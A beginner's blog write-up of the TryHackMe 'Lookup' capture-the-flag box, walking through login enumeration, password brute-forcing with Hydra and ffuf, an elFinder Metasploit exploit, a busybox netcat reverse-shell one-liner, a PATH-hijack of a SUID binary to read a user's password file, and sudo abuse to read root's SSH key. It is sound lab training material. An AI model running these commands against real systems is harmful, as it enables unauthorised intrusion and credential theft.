---
title: "THM Lookup CTF Write-Up"
date: 2024-12-27 03:49:00 +0000
categories: [Write-up]
tags: [CTF, Write-up]
---

![Lookup Banner](assets/images/post-27-12-24/Lookup_image.png)

Lookup is an Easy box on TryHackMe. This is my first ever CTF so I got stuck in a lot of places and needed lots of help to get through.
I have written this write-up to help beginners like myself get through the box I also try my best to explain the commands I used and why I used them though I recommend reading through the man or help pages for the specific commands.
Now, enough talking. Let's get into it.

## Reconnaissance

This is the first and most important step when playing CTFs. In this stage, you gather valuable information about the ports that are open on the target and the services running on these ports.

![Nmap Scan Results](assets/images/post-27-12-24/nmap_scan_results.png)

From the output in the image above, we can see we have two ports open; 22 and 80. SSH is running on port 22 and we have a web server running on port 80. We can also see the version of SSH being used, the particular web server being used and what OS the target is running

Since we have a web server running on the target, let's enter the IP Address of the target into the web server. We can see that the website is redirecting us to “lookup.thm”, so let’s add that to our hosts file and take a look.

## Login Portal

![Login Portal for lookup](assets/images/post-27-12-24/login_portal.png)

We are presented with a login form.
The first thing I did was to look at the source code for the page to see if I could find anything interesting.

![Source code of login page](assets/images/post-27-12-24/source_code_of_login_portal.png)

I did not find anything interesting so I tried to check for SQL Injection (SQLi) vulnerabilities but that also came up as not useful.

Next I tried some default credentials "admin:admin" and I received a very interesting error

![Verbose error for wrong password](assets/images/post-27-12-24/wrong_password_admin_login_attempt.png)

"Wrong password" clearly means that the user "admin" exists. Let's try using the credentials "moondie:test" and see the error we get

![Verbose error for wrong username](assets/images/post-27-12-24/wrong_password_admin_login_attempt.png)

Trying it, we get this error instead. From this, I am able to deduce that we based on the error that is returned, we can tell if a username is valid or not.

## Username Enumeration

With the errors that are returned, I am going to use that to enumerate valid usernames for that application. With the valid usernames I would then brute-force for the passwords. I am using the 'ffuf' tool for the username enumeration. Other tools like ZAP or Burp could be used but this is my personal preference.

I added 'Content-Type: application/x-www-form-urlencoded' as this is required when submitting forms and I also filtered results using the string "Wrong username" as this indicates an invalid username.

The is the [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt) I used.

![Results from ffuf](assets/images/post-27-12-24/ffuf_for_username_enumeration.png)

From the results, we see that we have found two valid usernames; "admin" & "jose"

## Password Brute-force

Now that we have valid usernames, let's brute-force for their respective passwords.

I started with the admin account as that seems more 'juicy'

I also used ffuf for this and then filtered based on the most common response size which was 62 for more. In brute-forcing there will be lot's of invalid credentials and the response size for that was 62 so by filtering that out, I essentially filtered out all the invalid attempts

![Ffuf results for password brute-forcing](assets/images/post-27-12-24/password_bruteforece_for_admin.png)

I have edited out the password from the image. Now that I have the password for the 'admin' user, I'm moving on to the 'jose' user.

I tried to use ffuf for this as well but I was running into some issues. I tried resolving it but to no avail. In the end, I used Hydra. Below is the exact command I used. I used the rockyou.txt wordlist for brute-forcing attack.

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

I filtered the output using the string "Wrong" as that will be the error that is returned when the brute-force attempt is not successful.

![Password for 'jose' user](assets/images/post-27-12-24/password_bruteforce_for_jose.png)

Now I have the password for both users. Let's try logging in with the credentials.

## Logging In

With the credentials I have acquired, I went back to the login page and tried to log in.
I first tried the admin credentials, but for some reason I was getting the "Wrong username or password" error. When I tried another password but with the same username (admin) I got the "Wrong password" error. This was very interesting, I assumed it was a mechanism intentionally installed so I just forgot about it and moved to the 'jose' user.

Logging in with the credentials of 'jose', I was redirected to "files.lookup.thm" but since this wasn't added to my /etc/hosts file I could not view the page. After adding it to my hosts file, I was redirected to this webpage.

## ElFinder

I looked around and noticed that elFinder was some kind of files manager. I looked through all the files but I did not find anything relevant. I clicked on the "Info" icon on the elFinder homepage and found the version information.

![elFinder Homepage](assets/images/post-27-12-24/elfinder_homepage.png)

![ElFinder Version Info](assets/images/post-27-12-24/elFinder_version.png)

This was a great find because with this, I will be able to search online for exploits that target this specific version of elFinder and potentially get RCE (Remote Code Execution).

### Searching for the exploit

Using the searchsploit tool, I searched for available exploits on elFinder.

![Searchsploit results](assets/images/post-27-12-24/elfinder_exploit_in_metasploit.png)

## Metasploit

I decided to go with the Metasploit exploit so I fired it up and searched for the exploit there.

![Metasploit framework console](assets/images/post-27-12-24/search_and_use_exploit_in_metasploit.png)

After searching for the exploit and selecting it in Metasploit, I set the relevant options which was RHOSTS and LHOST and then run the exploit.

![Successful shell on target](assets/images/post-27-12-24/success_exploit.png)

After running the exploit, I successfully got the shell. Now, I ran into a lot of problems here.
Using the 'shell' command in meterpreter did not return me a stable enough shell. I used other techniques to try to stabilize the shell but none worked reasonably.

I looked online and found a way to open up a port on the target that has the bash shell running and then connect to that port from my machine.

After I entered the 'shell' on meterpreter, I entered the command below to do this.

```bash
busybox nc <YOUR_IP> <YOUR_PORT> -e bash
```

Remember to replace YOUR_IP and YOUR_PORT with the actual values.

![Busybox command](assets/images/post-27-12-24/busybox_command.png)

Back in the netcat listener I started on my machine, I got the shell

![netcat shell](assets/images/post-27-12-24/success_netcat_shell.png)

With the netcat shell now operational, it was really easy to stabilize the shell and do what I needed to do from here. TryHackMe has a great room on Shells that explains some shell stabilizing techniques, you can also find some great resources online on how to do this.

## Privilege Escalation

After getting the shell on the target, I started off with user enumeration.

![User Enumeration](assets/images/post-27-12-24/users-enumerration-on-target.png)

We are currently operating as the 'www-data' user. From the results above, we notice there is a 'think' user.

Let's look in think's home directory to see if there is anything interesting

![thinks home directory](assets/images/post-27-12-24/passwords_file_in_think's_home.png)

We notice there is a '.passwords' file. That is very interesting, but we (www-data) do not have permissions to access the file so we have to find a way to read the file as the think user so we can see it's contents.

Next, we'll search for SUIDs. SUID stands for “Set User ID”, and it is a special type of permission that can be given to a file so the file is always run with the permissions of the owner instead of the user executing it.

```bash
find / -perm /4000 2>/dev/null
```

![SUIDs](assets/images/post-27-12-24/interesting-SUID.png)

We have an interesting SUID here. It is interesting because it is not a common SUID on Linux machines and we can also see that the file is owned by root.

Let's execute it and try to deduce what exactly the file does. When we understand what it does, it will be easy to exploit it.

![Output of /usr/sbin/pwm](assets/images/post-27-12-24/output_of_running_intersting_SUID.png)

This is basically self-explanatory. It runs the 'id' command, takes the result of the command and then reads the '.passwords' file in the home directory of the user that was output by the 'id' command.

```bash
/home/<RESULT_OF_ID>/.passwords
```

From this understanding of the execution of the file, if we are able to manipulate the 'id' command to return 'think' as the output, we will be able to read the contents of the '.passwords' file.

We will try to manipulate the program by having it run a different 'id' command (we will create later) that will output 'think'. Let's get into it

### Creating a false 'id' command

We will make a new id file in the /tmp/ directory on the target and then add that to the path. We will add the /tmp/ directory to the beginning of PATH so it's the first place that the program looks for the 'id' command to run (our false id command will be here).

```bash
export PATH=/tmp:$PATH
```

Below is the contents of the /tmp/id file.

```bash
#!/bin/bash
echo uid=33(think) gid=33(think) groups=33(think)
```

Running the id command as the 'www-data' user results in;

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So I just changed the 'www-data' to 'think'.

Now, lets execute the file again

![Output of .passwords file](assets/images/post-27-12-24/password_list_for_think.png)

We are able to successfully read the .passwords file for the think user! The file seems to be a password list so let's save it's content into a file and then brute-force the think user.

### Brute-forcing the password for think

In the brute-force attack, I used this [tool](https://github.com/carlospolop/su-bruteforce/tree/master) which I found after searching online. The tool requires two main arguments to run; the username and then the wordlist.

![Password Brute-force](assets/images/post-27-12-24/think_password.png)

We have successfully found the think user's password so we can now log into the account.

![Logging in as think](assets/images/post-27-12-24/logged_in_as_think.png)

### Gaining root access

Now that we are logged in as think, let's check the sudo privileges for the user

```bash
sudo -l
```

![Sudo Privileges for think](assets/images/post-27-12-24/usr_bin_look.png)

We see from the output above that we can run the 'look' command as root. Knowing this, we will check [GTFOBins](https://gtfobins.github.io/) to see if we can exploit this. GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

According to GTFOBins, we can use this binary to read files on the system. Since we can run this as root, we can read any file on the system! From the Nmap scan we noticed SSH was running on the system, so we can get the root user's private key and then SSH into the machine as root.

![Reading the Private Key](assets/images/post-27-12-24/root-ssh-key.png)

We can then save the contents of the file to our local machine and then SSH into the target as root.

![Logged in as root](assets/images/post-27-12-24/gained_root.png)

We have now gained root on the target! You can now look around for the root and user flags.

## Summary

This was a very fun box to hack, I got to put into practice a lot of the stuff I learnt from TryHackMe's Jr. Penetration Tester pathway. This has also taught me that there isn't just one way to do things, if strategy A isn't working out take some time and devise a new strategy. 

I hope you found this helpful. Happy hacking to you all. Till me meet again :-)
